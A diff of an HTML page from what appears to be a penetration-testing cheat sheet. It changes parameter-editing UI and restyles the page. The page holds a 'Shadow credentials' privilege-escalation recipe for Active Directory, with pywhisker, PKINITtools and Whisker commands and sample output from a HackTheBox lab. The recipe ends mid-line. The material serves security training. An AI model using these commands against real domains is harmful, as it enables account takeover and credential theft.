@@ -153,150 +153,21 @@
   <div class="tips">
   <p><strong>Usage Tips:</strong></p>
   <ul>
+    <li>Click on a keyword to enable inline editing.</li>
     <li>Click inside a code block to copy (excludes comments).</li>
     <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
     <li>Click outside to collapse all examples.</li>
   </ul>
 </div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="AS_REP_ENC_KEY">AS REP ENC KEY: </label><input type="text" name="AS_REP_ENC_KEY"></div><div class="input-group"><label for="BASE64_PFX">BASE64 PFX: </label><input type="text" name="BASE64_PFX"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="GENERATED_PASSWORD">GENERATED PASSWORD: </label><input type="text" name="GENERATED_PASSWORD"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="PFX_FILE">PFX FILE: </label><input type="text" name="PFX_FILE"></div><div class="input-group"><label for="PFX_PASSWORD">PFX PASSWORD: </label><input type="text" name="PFX_PASSWORD"></div><div class="input-group"><label for="TARGET_USER">TARGET USER: </label><input type="text" name="TARGET_USER"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div></form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="AS_REP_ENC_KEY">AS REP ENC KEY: </label><input type="text" name="AS_REP_ENC_KEY"></div><div class="input-group"><label for="BASE64_PFX">BASE64 PFX: </label><input type="text" name="BASE64_PFX"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="GENERATED_PASSWORD">GENERATED PASSWORD: </label><input type="text" name="GENERATED_PASSWORD"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="PFX_FILE">PFX FILE: </label><input type="text" name="PFX_FILE"></div><div class="input-group"><label for="PFX_PASSWORD">PFX PASSWORD: </label><input type="text" name="PFX_PASSWORD"></div><div class="input-group"><label for="TARGET_USER">TARGET USER: </label><input type="text" name="TARGET_USER"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
 	<div class="buttons center">
-		<button id="form_btn">Show Params Form</button>
+		<button id="form_btn">Show Inspector</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
 		<button id="reset_btn" style="display: none;">Reset</button>
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-<style>
-#dynamicFormContainer {
-	width: 100%;
-	margin: 0 auto;
-	background-color: white;
-	padding: 0;
-	box-shadow: 1px 4px 10px 1px #aaa;
-	font-family: system-ui;
-}
-
-#dynamicFormContainer * {
-    box-sizing: border-box;
-}
-
-#dynamicFormContainer input {
-  border-radius: 0.2em;
-  margin-bottom: 15px;
-}
-
-#dynamicFormContainer input:focus {
-  outline: 0.1em solid var(--secondary);
-}
-
-#dynamicFormContainer input[type=text] {
-  width: 100%;
-  border-radius: 0.2em;
-  border: 0.1em solid var(--secondary);
-  padding: 0.4rem;
-  font-size: 0.9rem;
-}
-
-#dynamicFormContainer label {
-	color: #333333;
-	font-size: 0.9rem;
-}
-
-#dynamicFormContainer button {
-	display: inline-block;
-	margin: 20px auto;
-	width: 150px;
-	height: 40px;
-	border-radius: 25px;
-	border: none;
-	color: #f5f5f5;
-	font-weight: 700;
-	background: rgba(44, 82, 179);
-	grid-column: 1 / span 2;
-    justify-self: center;
-}
-
-#dynamicFormContainer button:hover {
-    cursor: pointer;
-    background: rgba(44, 82, 179, 0.95);
-}
-
-#dynamicForm {
-    grid-template-columns: 1fr 1fr;
-    column-gap: 20px;
-    row-gap: 0px;
-    margin: 0 auto;
-    padding: 30px 20px 0;
-}
-
-.input-group {
-    display: flex;
-    flex-direction: column;
-}
-
-.center {
-	display: flex;
-	justify-content: center;
-	align-items: center;
-}
-
- 
-body.dark-mode #dynamicFormContainer {
-	width: 100%;
-	margin: 0 auto;
-	background-color: #23272a;
-	padding: 0;
-	box-shadow: 1px 4px 10px 1px #23272a;
-	font-family: system-ui;
-}
-
-body.dark-mode #dynamicFormContainer * {
-    box-sizing: border-box;
-}
-
-body.dark-mode #dynamicFormContainer input {
-	border-radius: 0.2em;
-	border: 0.1em solid #eeeeee;
-}
-
-body.dark-mode #dynamicFormContainer input:focus {
-	outline: 0.1em solid #616161;
-}
-
-body.dark-mode #dynamicFormContainer input[type=text] {
-  width: 100%;
-  border-radius: 0.2em;
-  border: 0.1em solid #616161;
-  padding: 0.4rem;
-  font-size: 0.9rem;
-  background-color: #bdbdbd;
-}
-
-body.dark-mode #dynamicFormContainer label {
-	color: #fafafa;
-	font-size: 0.9rem;
-}
-
-body.dark-mode #dynamicFormContainer button {
-	display: inline-block;
-	margin: 20px auto;
-	width: 150px;
-	height: 40px;
-	border-radius: 25px;
-	border: none;
-	color: #fafafa;
-	font-weight: 700;
-	background: #616161;
-	grid-column: 1 / span 2;
-    justify-self: center;
-}
-
-body.dark-mode #dynamicFormContainer button:hover {
-    cursor: pointer;
-    background: #424242;
-}
-</style>
   <h3 id="privesc-1-shadow-credentials">Privesc #1: Shadow credentials</h3>
 <p class="tabs">
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
@@ -304,14 +175,14 @@ body.dark-mode #dynamicFormContainer button:hover {
 <button data-tabset="set1" data-tabcontent="tab2">Windows</button>
 
 </p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="0-pre-check-optional">0. Pre-check [optional]</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 pywhisker.py -t '<span class="o">&lt;TARGET_USER&gt;</span>' --action list -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' --dc-ip <span class="o">&lt;DC_IP&gt;</span> --use-ldaps
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 pywhisker.py -t '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' --action list -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' --dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> --use-ldaps
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> python3 pywhisker.py --action list -d outdated.htb -u <span class="s1">'btables'</span> -p <span class="s1">'5myBPLPDKT3Bfq'</span> --dc-ip 10.10.11.175 -t <span class="s1">'sflowers'</span> --use-ldaps
 </span></span><span class="line"><span class="cl"><span class="go">[*] Searching for the target account
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute
 </span></span></span></div></pre></div><h4 id="1-add-shadow-credentials">1. Add shadow credentials</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 pywhisker.py --action add -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' --dc-ip <span class="o">&lt;DC_IP&gt;</span> -t '<span class="o">&lt;TARGET_USER&gt;</span>' --use-ldaps
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 pywhisker.py --action add -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' --dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -t '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' --use-ldaps
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> python3 pywhisker.py --action add -d outdated.htb -u <span class="s1">'btables'</span> -p <span class="s1">'5myBPLPDKT3Bfq'</span> --dc-ip 10.10.11.175 -t <span class="s1">'sflowers'</span> --use-ldaps
 </span></span><span class="line"><span class="cl"><span class="go">[*] Searching for the target account
@@ -330,7 +201,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span><span class="line"><span class="cl"><span class="go">pip3 install -I pyopenssl==24.0.0
 </span></span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div><h4 id="2-request-tgt-using-the-pfx">2. Request TGT using the PFX</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o">&lt;DC&gt;</span> &amp;&amp; python3 gettgtpkinit.py -cert-pfx <span class="o">&lt;PFX_FILE&gt;</span> -pfx-pass '<span class="o">&lt;GENERATED_PASSWORD&gt;</span>' '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;TARGET_USER&gt;</span>' <span class="o">&lt;TARGET_USER&gt;</span>.ccache -dc-ip <span class="o">&lt;DC&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC&gt;</span> &amp;&amp; python3 gettgtpkinit.py -cert-pfx <span class="o editable-keyword">&lt;PFX_FILE&gt;</span> -pfx-pass '<span class="o editable-keyword">&lt;GENERATED_PASSWORD&gt;</span>' '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>.ccache -dc-ip <span class="o editable-keyword">&lt;DC&gt;</span>
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s 10.10.11.175 <span class="o">&amp;&amp;</span> python3 gettgtpkinit.py -cert-pfx 3p24aKIn.pfx -pfx-pass <span class="s1">'qFhAIiIMg5ys4SQYYOst'</span> <span class="s1">'outdated.htb/sflowers'</span> sflowers.ccache -dc-ip 10.10.11.175
 </span></span><span class="line"><span class="cl"><span class="err">
@@ -345,9 +216,9 @@ TO-DO</div></pre></div><h4 id="2-request-tgt-using-the-pfx">2. Request TGT using
 </span></span></span><span class="line"><span class="cl"><span class="go">2024-09-23 01:48:38,990 minikerberos INFO     Saved TGT to file
 </span></span></span><span class="line"><span class="cl"><span class="go">INFO:minikerberos:Saved TGT to file
 </span></span></span></div></pre></div><h4 id="3-get-nt-hash">3. Get NT hash</h4>
-<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=<span class="o">&lt;TARGET_USER&gt;</span>.ccache
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>.ccache
 </span></span></span></code><div class="output-bubble">Sample Output:
-TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 getnthash.py '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;TARGET_USER&gt;</span>' -key <span class="o">&lt;AS_REP_ENC_KEY&gt;</span>
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 getnthash.py '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' -key <span class="o editable-keyword">&lt;AS_REP_ENC_KEY&gt;</span>
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> python3 getnthash.py <span class="s1">'outdated.htb/sflowers'</span> -key a1870bb416f2b965df3df681288f3b272119d86288c67c572675b80ea1bedd94
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -359,7 +230,7 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/ShutdownRepo/pywhisker">pywhisker</a></em></small>
 <br>
 <small><em>Ref: <a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></em></small></p></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="0-pre-check-optional">0. Pre-check [optional]</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\whisker.exe list /domain:<span class="o">&lt;DOMAIN&gt;</span> /target:'<span class="o">&lt;TARGET_USER&gt;</span>' /dc:<span class="o">&lt;DC&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\whisker.exe list /domain:<span class="o editable-keyword">&lt;DOMAIN&gt;</span> /target:'<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' /dc:<span class="o editable-keyword">&lt;DC&gt;</span>
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\whisker.exe list /domain:outdated.htb /target:'sflowers' /dc:10.10.11.175
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Searching for the target account
@@ -367,7 +238,7 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Listing deviced for sflowers:
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] No entries!
 </span></span></span></div></pre></div><h4 id="1-add-shadow-credentials">1. Add shadow credentials</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\whisker.exe add /domain:<span class="o">&lt;DOMAIN&gt;</span> /target:'<span class="o">&lt;TARGET_USER&gt;</span>' /dc:<span class="o">&lt;DC&gt;</span> /password:'<span class="o">&lt;PFX_PASSWORD&gt;</span>'
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\whisker.exe add /domain:<span class="o editable-keyword">&lt;DOMAIN&gt;</span> /target:'<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' /dc:<span class="o editable-keyword">&lt;DC&gt;</span> 